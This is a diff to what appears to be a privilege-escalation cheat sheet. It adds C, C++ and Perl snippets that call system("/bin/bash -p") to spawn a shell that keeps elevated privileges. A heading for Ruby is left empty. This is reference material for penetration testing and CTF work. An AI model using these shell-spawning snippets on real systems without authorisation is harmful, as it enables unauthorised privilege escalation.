@@ -29,12 +29,29 @@ print "cmd /c mvn".execute().text
 ```
 ## C LANGUAGES
 C and C-family languages usually require compilation, with the exception of JavaScript.
-### C
+### C - System()
 ```
-#import<stdio.h>
+#import<stdlib.h>
 int main(void){
  system("/bin/bash -p");
  return 0;
 
 }
 ```
+### C++ - System()
+```
+#include <bits/stdc++.h> 
+using namespace std; 
+int main(void){
+ system("/bin/bash -p");
+ return 0;
+
+}
+```
+## Interpreterd Languages
+Sometimes, scripts can also call `system()`
+### Perl
+```
+perl -e 'system("/bin/bash -p");'
+```
+### Ruby
